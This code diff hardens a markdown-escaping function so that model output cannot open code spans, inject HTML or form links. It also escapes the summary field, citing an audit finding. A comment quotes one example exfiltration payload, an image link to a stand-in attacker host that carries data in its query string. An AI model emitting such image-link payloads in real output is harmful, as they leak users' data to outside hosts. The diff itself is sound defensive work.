@@ -757,16 +757,18 @@ function checkTypedValue(rule: ExtractionRule, value: PrimitiveFieldValue, warni
  */
 export function escapeMarkdown(value: string): string {
   // audit T-05: a GFM table cell must stay on one line and must not let the
-  // model's content open code spans or inject raw HTML. We strip C0/C1
-  // control chars (CR/LF survive), collapse line breaks to a space, then
-  // escape backslashes, backticks, pipes, and angle brackets.
+  // model's content open code spans, inject raw HTML, or form links/images
+  // (`![x](https://attacker/?d=...)` would load a remote image). We strip
+  // C0/C1 control chars (CR/LF survive), collapse line breaks to a space,
+  // backslash-escape `\`, backticks, pipes, brackets, parentheses, and `!`,
+  // and turn angle brackets into entities (which also defeats `<https://...>`
+  // autolinks). Bare URLs stay as text; GFM may still linkify them, which is
+  // the expected rendering of a URL value and never loads anything.
   return value
     // eslint-disable-next-line no-control-regex
-    .replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g, '')
+    .replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g, '')
     .replace(/[\r\n]+/g, ' ')
-    .replace(/\\/g, '\\\\')
-    .replace(/`/g, '\\`')
-    .replace(/\|/g, '\\|')
+    .replace(/[\\`|[\]()!]/g, '\\$&')
     .replace(/</g, '&lt;')
     .replace(/>/g, '&gt;');
 }
@@ -788,7 +790,8 @@ export function buildPresetMarkdown(result: PresetStructuredOutput, preset: Extr
   const sections: string[] = [
     `# ${preset.label} Extraction`,
     '',
-    result.summary,
+    // audit T-05: the summary is model output too.
+    escapeMarkdown(result.summary),
     '',
     '## Fields',
     '',
